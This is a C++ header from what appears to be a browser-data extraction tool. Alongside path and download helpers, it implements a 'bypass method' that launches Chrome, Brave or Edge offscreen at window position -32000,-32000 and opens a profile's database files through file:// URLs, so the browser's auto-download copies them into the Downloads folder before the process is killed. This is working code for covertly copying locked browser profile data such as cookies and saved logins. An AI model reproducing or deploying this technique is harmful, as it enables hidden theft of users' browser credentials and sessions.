#pragma once

// Standard library
#include <chrono>
#include <cctype>
#include <cstdio>
#include <cstring>
#include <filesystem>
#include <fstream>
#include <optional>
#include <string>
#include <string_view>
#include <vector>

// Project
#include <CLI/CLI.hpp>
#include "app/context.h"
#include "launchers/launcher.hpp"
#include "terminators/terminator.hpp"
#include "browsers/browsers.h"
#include "manager/manager.h"
#include "sleep/sleep.hpp"

// Platform
#if defined(_WIN32)
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <shlobj.h> // SHGetKnownFolderPath, FOLDERID_Downloads / FOLDERID_Profile
#if defined(_MSC_VER)
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "uuid.lib")
#endif
#else
#include <unistd.h>
#include <pwd.h>
#include <cstdlib>
#endif

namespace download_utils {

    // ---------------------------------------------------------------------------
    // Home directory of the current user. Empty only if it cannot be determined.
    // ---------------------------------------------------------------------------
    [[nodiscard]] inline std::filesystem::path getHomeDir() {
#if defined(_WIN32)
        // Prefer Known Folder (FOLDERID_Profile). Note: some contexts require
        // CoInitialize / CoInitializeEx before SHGetKnownFolderPath.
        PWSTR raw = nullptr;
        if (SUCCEEDED(::SHGetKnownFolderPath(FOLDERID_Profile, KF_FLAG_DEFAULT,
            nullptr, &raw)) && raw) {
            std::filesystem::path p(raw);
            ::CoTaskMemFree(raw);
            return p;
        }
        if (raw) ::CoTaskMemFree(raw);

        wchar_t buf[MAX_PATH * 2];
        DWORD n = ::GetEnvironmentVariableW(L"USERPROFILE", buf,
            static_cast<DWORD>(std::size(buf)));
        if (n > 0 && n < std::size(buf)) {
            return std::filesystem::path(buf, buf + n);
        }
        return {};
#else
        if (const char* h = std::getenv("HOME"); h && *h) {
            return std::filesystem::path(h);
        }
        if (const passwd* pw = ::getpwuid(::getuid()); pw && pw->pw_dir && *pw->pw_dir) {
            return std::filesystem::path(pw->pw_dir);
        }
        return {};
#endif
    }

#if !defined(_WIN32)
    // Turns "$HOME/Downloads" or "~/Downloads" into an absolute path.
    [[nodiscard]] inline std::filesystem::path expandHome(
        const std::string& s, const std::filesystem::path& home) {
        if (s.rfind("$HOME/", 0) == 0) return home / s.substr(6);
        if (s == "$HOME") return home;
        if (s.rfind("~/", 0) == 0) return home / s.substr(2);
        return std::filesystem::path(s);
    }

    // Parses ~/.config/user-dirs.dirs for XDG_DOWNLOAD_DIR=...
    [[nodiscard]] inline std::filesystem::path xdgUserDownloadDir(
        const std::filesystem::path& home) {
        std::filesystem::path cfg;
        if (const char* ch = std::getenv("XDG_CONFIG_HOME"); ch && *ch) {
            cfg = std::filesystem::path(ch);
        }
        else {
            cfg = home / ".config";
        }

        std::ifstream in(cfg / "user-dirs.dirs");
        if (!in) return {};

        std::string line;
        while (std::getline(in, line)) {
            std::size_t b = line.find_first_not_of(" \t");
            if (b == std::string::npos || line[b] == '#') continue;
            line.erase(0, b);

            constexpr std::string_view key = "XDG_DOWNLOAD_DIR";
            if (line.compare(0, key.size(), key) != 0) continue;

            std::size_t eq = line.find('=', key.size());
            if (eq == std::string::npos) continue;

            std::string val = line.substr(eq + 1);
            val.erase(0, val.find_first_not_of(" \t"));
            while (!val.empty() && (val.back() == '\n' || val.back() == '\r' ||
                val.back() == ' ' || val.back() == '\t')) {
                val.pop_back();
            }
            if (val.size() >= 2 && val.front() == '"' && val.back() == '"') {
                val = val.substr(1, val.size() - 2);
            }
            if (val.empty()) continue;

            return expandHome(val, home);
        }
        return {};
    }
#endif // !_WIN32

    // UTF-8 bytes of a path, using generic (forward-slash) form.
    // Works with and without char8_t.
    [[nodiscard]] inline std::string pathToUtf8(const std::filesystem::path& p) {
#if defined(__cpp_lib_char8_t)
        const std::u8string s = p.generic_u8string();
        return std::string(s.begin(), s.end());
#else
        return p.generic_u8string();
#endif
    }

    // ---------------------------------------------------------------------------
    // The current user's default downloads folder.
    // Empty only if the home directory itself is unknown.
    // Limitations: does not discover custom browser download directories that differ
    // from the OS/XDG default.
    // ---------------------------------------------------------------------------
    [[nodiscard]] inline std::filesystem::path getDownloadsDir() {
        const std::filesystem::path home = getHomeDir();

#if defined(_WIN32)
        PWSTR raw = nullptr;
        if (SUCCEEDED(::SHGetKnownFolderPath(FOLDERID_Downloads, KF_FLAG_DEFAULT,
            nullptr, &raw)) && raw) {
            std::filesystem::path p(raw);
            ::CoTaskMemFree(raw);
            return p;
        }
        if (raw) ::CoTaskMemFree(raw);
        return home.empty() ? std::filesystem::path{} : home / L"Downloads";
#elif defined(__APPLE__)
        return home.empty() ? std::filesystem::path{} : home / "Downloads";
#else // Linux / BSD
        if (home.empty()) return {};
        if (const char* xdg = std::getenv("XDG_DOWNLOAD_DIR"); xdg && *xdg) {
            return expandHome(xdg, home);
        }
        if (std::filesystem::path p = xdgUserDownloadDir(home); !p.empty()) {
            return p;
        }
        return home / "Downloads";
#endif
    }

    // ---------------------------------------------------------------------------
    // Waits for <getDownloadsDir()>/<filename of inputPath> to appear and stop
    // growing. Returns the full path, or an empty path on timeout / failure.
    // Only the filename of inputPath is used, so a full input path is fine.
    // Limitation: relies on the browser using the default Downloads location.
    // All times are in milliseconds.
    // ---------------------------------------------------------------------------
    [[nodiscard]] inline std::filesystem::path waitForDownload(
        const std::filesystem::path& inputPath,
        int timeoutMs = 60000,
        int pollEveryMs = 200,
        int settleMs = 600) {

        const std::filesystem::path dir = getDownloadsDir();
        if (dir.empty()) return {};

        const std::filesystem::path target = dir / inputPath.filename();
        const auto deadline = std::chrono::steady_clock::now() +
            std::chrono::milliseconds(timeoutMs);

        std::uintmax_t lastSize = 0;
        int stableForMs = 0;
        bool seen = false;

        for (;;) {
            std::error_code ec;
            if (std::filesystem::is_regular_file(target, ec)) {
                const std::uintmax_t size = std::filesystem::file_size(target, ec);
                if (!ec) {
                    if (seen && size == lastSize) {
                        stableForMs += pollEveryMs;
                        if (stableForMs >= settleMs) return target;
                    }
                    else {
                        stableForMs = 0;
                    }
                    lastSize = size;
                    seen = true;
                }
            }
            if (std::chrono::steady_clock::now() >= deadline) return {};
            sleepMs(pollEveryMs);
        }
    }

    // No waiting -- is the expected download present right now?
    [[nodiscard]] inline bool downloadExists(const std::filesystem::path& inputPath) {
        const std::filesystem::path dir = getDownloadsDir();
        if (dir.empty()) return false;
        std::error_code ec;
        return std::filesystem::is_regular_file(dir / inputPath.filename(), ec);
    }

    // Percent-encode a single byte for URL use (uppercase hex).
    inline void percentEncodeByte(unsigned char c, std::string& out) {
        static constexpr char hex[] = "0123456789ABCDEF";
        out += '%';
        out += hex[(c >> 4) & 0xF];
        out += hex[c & 0xF];
    }

    // ---------------------------------------------------------------------------
    // Absolute path -> file:// URL, percent-encoded, UTF-8 safe.
    // /home/me/a b.pdf -> file:///home/me/a%20b.pdf
    // C:\Users\me\a.pdf -> file:///C:/Users/me/a.pdf
    // ---------------------------------------------------------------------------
    [[nodiscard]] inline std::string toFileUrl(const std::filesystem::path& p) {
        std::error_code ec;
        std::filesystem::path abs = std::filesystem::absolute(p, ec);
        if (ec) abs = p;

        const std::string s = pathToUtf8(abs.lexically_normal());
        std::string out = "file://";

        // Windows drive letters need an extra leading slash: file:///C:/...
        if (!s.empty() && s.front() != '/') {
            out += '/';
        }

        for (unsigned char c : s) {
            // Unreserved + a few path-safe characters that file:// tolerates.
            if (std::isalnum(c) || c == '-' || c == '.' || c == '_' || c == '~' ||
                c == '/' || c == ':') {
                out += static_cast<char>(c);
            }
            else {
                percentEncodeByte(c, out);
            }
        }
        return out;
    }

} // namespace download_utils


class WindowposDownloader final : public Downloader {
public:
    WindowposDownloader(Context& windowposCtx, std::string browserPath)
        : ctx_(windowposCtx)
        , path_(std::move(browserPath))
    {
    }

    const char* name() const override { return "browser-windowpos"; }

    bool setup() override {
        return true;
    }

    bool teardown() override {
        if (!ctx_.kill) {
            return true;
        }

        if (firstPid_ < 0) {
            // Never successfully launched anything.
            return true;
        }

        ctx_.out.verbosePrint("attempting to kill browser with PID: " +
            std::to_string(firstPid_));
        Terminator terminator(firstPid_);
        TerminationResult termResult = terminator.kill();
        if (!termResult) {
            ctx_.out.error("failed to terminate browser process (error: " +
                termResult.detail + ")");
            return false;
        }

        ctx_.out.print("successfully killed the browser process");
        firstPid_ = -1;
        return true;
    }

    DownloadResult fetch(const DownloadRequest& req) override {
        DownloadResult r;

        std::vector<std::string> args = {
            "--window-position=-32000,-32000",
            "--no-first-run",
            "--no-default-browser-check",
            "--user-data-dir=" + ctx_.profileDirectory,
            download_utils::toFileUrl(req.input),
        };

        Launcher launcher(path_, args);
        ctx_.out.verbosePrint("launching browser: " + launcher.commandLine());

        auto launchResult = launcher.launch();
        if (!launchResult || !launchResult.ok) {
            std::string errorMessage = launchResult.detail + " (error " +
                std::to_string(launchResult.errorCode) + ")";
            ctx_.out.error("failed to launch browser '" + path_ + "': " +
                errorMessage);
            r.errorCode = launchResult.errorCode;
            r.detail = errorMessage;
            r.ok = false;
            return r;
        }

        // Only the *first* successful launch is tracked and later killed.
        if (firstPid_ < 0) {
            firstPid_ = launchResult.pid;
            ctx_.out.print("successfully launched chromium browser with PID: " +
                std::to_string(firstPid_));
        }
        else {
            ctx_.out.verbosePrint("launched additional browser instance with PID: " +
                std::to_string(launchResult.pid));
        }

        auto saved = download_utils::waitForDownload(req.input, 60000);
        if (saved.empty()) {
            r.ok = false;
            r.detail = "failed to find the file locally after launching the "
                "chromium browser; the user probably has a custom "
                "download directory (this method only watches the "
                "default Downloads folder).";
            return r;
        }

        std::error_code ec;
        const std::uintmax_t bytes = std::filesystem::file_size(saved, ec);
        if (ec) {
            r.ok = false;
            r.detail = "cannot stat '" + saved.string() + "': " + ec.message();
            ctx_.out.error(r.detail);
            return r;
        }

        r.filePath = saved.string();
        r.bytes = bytes;
        r.ok = true;
        return r;
    }

private:
    Context& ctx_;
    std::string path_;
    int firstPid_ = -1; // only the first successful launch is tracked/killed
};

// ---------------------------------------------------------------------------
// Single bypass method (CLI subcommand)
// ---------------------------------------------------------------------------
class BypassMethod {
public:
    void setup(CLI::App& cli, Context& ctx);
    void run(Context& ctx);

private:
    std::string launch;
};

inline void BypassMethod::setup(CLI::App& cli, Context& ctx)  {
    auto* sub = cli.add_subcommand(
        "windowspos",
        "launches a chromium browser offscreen and triggers the auto-download feature to download the profile database files");
    sub->add_option("-L,--launch", launch,
        "The browser to use when downloading the files. "
        "Usage: -L <browser>, e.g. -L chrome, -L brave, or -L edge.")
        ->required();
    sub->callback([this, &ctx]() { run(ctx); });
}

inline void BypassMethod::run(Context& ctx) {
    std::optional<Browser> browser = browserFromName(launch);
    if (!browser) {
        ctx.out.error("unknown browser name '" + launch + "'");
        return;
    }

    auto path = resolveBrowser(*browser);
    if (!path) {
        ctx.out.error("browser '" + launch +
            "' is not installed, or its executable could not be found");
        return;
    }

    Manager mgr(ctx);
    WindowposDownloader downloader(ctx, path.value());
    mgr.downloadProfile(downloader);
}